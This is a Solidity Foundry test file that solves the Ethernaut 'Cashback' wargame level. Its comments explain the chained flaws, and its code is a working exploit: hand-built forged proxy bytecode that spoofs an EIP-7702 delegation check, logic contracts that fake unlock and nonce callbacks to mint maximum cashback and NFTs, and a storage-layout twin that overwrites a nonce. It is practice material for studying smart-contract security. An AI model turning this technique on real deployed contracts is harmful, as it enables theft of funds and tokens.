// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {Cashback, Currency} from "../src/levels/Cashback.sol";
import {SuperCashbackNFT, FreedomCoin} from "../src/levels/CashbackFactory.sol";
import {IERC1155} from "oz54/token/ERC1155/IERC1155.sol";
import {IERC721} from "oz54/token/ERC721/IERC721.sol";
import {ERC1155} from "oz54/token/ERC1155/ERC1155.sol";

/// Ethernaut "Cashback" → forged EIP-7702 delegation-designator bypass + trusted-amount accrual.
/// (catalog candidate: incomplete-provenance / spoofed-caller-identity — SC01/SC02.)
/// Needs FOUNDRY_PROFILE=prague (solc 0.8.30 `layout at`, transient storage, EIP-7702 cheatcode).
///
/// Win (factory validateInstance): player holds NATIVE_MAX_CASHBACK (1e18) + FREE_MAX_CASHBACK
/// (500e18) ERC1155 cashback, owns the SuperCashbackNFT id=uint160(player) AND >=2 NFTs total, and
/// player.code == 0xef0100‖instance (EIP-7702-delegated to Cashback).
///
/// Three bugs chained:
///  1. `onlyDelegatedToCashback` authenticates the caller by reading `msg.sender.code[23:]` and
///     checking it equals the Cashback address — i.e. it trusts the *bytes* of the caller's code,
///     not a real 7702 delegation. A contract with the Cashback address planted at that offset
///     (and a minimal-proxy tail that delegatecalls to attacker logic) passes the check.
///  2. `accrueCashback(currency, amount)` trusts `amount` — no proof a transfer occurred — and
///     `onlyUnlocked`/`consumeNonce` are external calls to `msg.sender`, so the forged caller just
///     returns `isUnlocked()=true` and `consumeNonce()=10000`. → mint max cashback + an NFT, free.
///  3. Cashback mints with raw `_update` (no ERC1155 acceptance check), and we move the points to
///     the player *while it is still a codeless EOA* (acceptance check is skipped for EOAs); only
///     at the end do we 7702-delegate the player.
/// The player's own NFT (id=uint160(player), needs msg.sender==player) is minted by temporarily
/// delegating the player to a storage-layout-twin (`NonceSetter`) to set nonce=9999, then
/// re-delegating to Cashback and doing one call → nonce 10000 → mint(player).
///
/// Forged-proxy bytecode technique credit: Max Andreev's Cashback writeup / rosarioborgesi solution.
contract CashbackTest is Test {
    address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address constant BOB = address(0xB0B);
    uint256 constant NATIVE_MAX = 1 ether;
    uint256 constant FREE_MAX = 500 ether;

    Cashback cashback;
    SuperCashbackNFT nft;
    FreedomCoin FREE;
    Account playerAcc;
    address player;
    address receiver = makeAddr("receiver");

    function setUp() public {
        // Mirror CashbackFactory.createInstance.
        nft = new SuperCashbackNFT();
        FREE = new FreedomCoin();
        FREE.mint(BOB, 100 ether);

        address[] memory cur = new address[](2);
        cur[0] = NATIVE;
        cur[1] = address(FREE);
        uint256[] memory rates = new uint256[](2);
        rates[0] = 50;
        rates[1] = 200;
        uint256[] memory maxc = new uint256[](2);
        maxc[0] = NATIVE_MAX;
        maxc[1] = FREE_MAX;
        cashback = new Cashback(cur, rates, maxc, address(nft));
        nft.transferOwnership(address(cashback));

        playerAcc = makeAccount("player");
        player = playerAcc.addr;
        vm.deal(player, 1 ether);
    }

    function test_solve_cashback() public {
        ForgedProxyFactory factory = new ForgedProxyFactory();

        // 1. FREE cashback (500e18) + 1 NFT to the player, with no FREE tokens (player is EOA).
        FreeDelegationLogic freeLogic =
            new FreeDelegationLogic(address(cashback), address(FREE), player, address(nft));
        FreeDelegationLogic(factory.deploy(address(cashback), address(freeLogic))).attack();

        // 2. NATIVE cashback (1e18) to the player, faking a 200 ETH payment.
        NativeDelegationLogic nativeLogic = new NativeDelegationLogic(address(cashback), player);
        NativeDelegationLogic(factory.deploy(address(cashback), address(nativeLogic))).attack();

        // 3. Set the player's nonce to 9999 via a storage-layout twin, then re-delegate to Cashback.
        NonceSetter setter = new NonceSetter();
        vm.signAndAttachDelegation(address(setter), playerAcc.key);
        vm.prank(player, player);
        NonceSetter(payable(player)).setNonce();

        vm.signAndAttachDelegation(address(cashback), playerAcc.key);

        // 4. One delegated call: nonce 9999→10000 → mint(player) (id=uint160(player)).
        vm.prank(player, player);
        Cashback(payable(player)).payWithCashback(Currency.wrap(NATIVE), receiver, 1 wei);

        // 5. Validate (factory validateInstance).
        assertEq(cashback.balanceOf(player, uint256(uint160(NATIVE))), NATIVE_MAX, "native cashback maxed");
        assertEq(cashback.balanceOf(player, uint256(uint160(address(FREE)))), FREE_MAX, "free cashback maxed");
        assertEq(nft.ownerOf(uint256(uint160(player))), player, "owns own NFT");
        assertGe(nft.balanceOf(player), 2, ">=2 NFTs");
        bytes23 expected = bytes23(bytes.concat(hex"ef0100", abi.encodePacked(address(cashback))));
        assertEq(player.code.length, 23, "7702 designator length");
        assertEq(bytes23(player.code), expected, "delegated to Cashback");
    }
}

/// Deploys a contract whose runtime code (a) carries `cashback` at the offset
/// `onlyDelegatedToCashback` reads (`mload(code+0x17)` → bytes [3..23)), and (b) is a minimal proxy
/// delegatecalling to `implementation`. So it passes the delegation check AND runs attacker logic.
contract ForgedProxyFactory {
    function deploy(address cashback, address implementation) external returns (address proxy) {
        bytes memory runtime = abi.encodePacked(
            hex"75", bytes2(0), bytes20(cashback), hex"50", // PUSH22 <pad><cashback> POP (plants addr at offset 3)
            hex"363d3d373d3d3d363d73", bytes20(implementation), hex"5af43d82803e903d91604357fd5bf3" // EIP-1167 proxy
        );
        bytes memory creation = abi.encodePacked(hex"60", bytes1(uint8(runtime.length)), hex"80600b6000396000f3", runtime);
        assembly {
            proxy := create(0, add(creation, 0x20), mload(creation))
        }
        require(proxy != address(0), "deploy failed");
    }
}

interface ICashback {
    function accrueCashback(Currency currency, uint256 amount) external;
}

/// Logic the forged FREE proxy delegatecalls into.
contract FreeDelegationLogic {
    address public immutable cashback;
    address public immutable free;
    address public immutable player;
    address public immutable nft;

    constructor(address _c, address _f, address _p, address _n) {
        cashback = _c;
        free = _f;
        player = _p;
        nft = _n;
    }

    function isUnlocked() external pure returns (bool) {
        return true; // bypass onlyUnlocked
    }

    function consumeNonce() external pure returns (uint256) {
        return 10000; // trigger the SuperCashbackNFT mint
    }

    function attack() external {
        ICashback(cashback).accrueCashback(Currency.wrap(free), 25_000 ether); // 25000 * 2% = 500e18 (max)
        uint256 id = uint256(uint160(free));
        IERC1155(cashback).safeTransferFrom(address(this), player, id, IERC1155(cashback).balanceOf(address(this), id), "");
        IERC721(nft).transferFrom(address(this), player, uint256(uint160(address(this)))); // NFT minted to this proxy
    }
}

/// Logic the forged NATIVE proxy delegatecalls into.
contract NativeDelegationLogic {
    address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address public immutable cashback;
    address public immutable player;

    constructor(address _c, address _p) {
        cashback = _c;
        player = _p;
    }

    function isUnlocked() external pure returns (bool) {
        return true;
    }

    function consumeNonce() external pure returns (uint256) {
        return 1; // not 10000: no NFT needed here, just the cashback
    }

    function attack() external {
        ICashback(cashback).accrueCashback(Currency.wrap(NATIVE), 200 ether); // 200 * 0.5% = 1e18 (max)
        uint256 id = uint256(uint160(NATIVE));
        IERC1155(cashback).safeTransferFrom(address(this), player, id, IERC1155(cashback).balanceOf(address(this), id), "");
    }
}

/// Storage-layout twin of Cashback (same `layout at` slot + ERC1155 parent) so a write to `nonce`
/// from a temporary 7702 delegation lands in Cashback's `nonce` slot.
contract NonceSetter layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba00 is ERC1155 {
    uint256 public nonce;

    constructor() ERC1155("") {}

    function setNonce() external {
        nonce = 9999;
    }
}
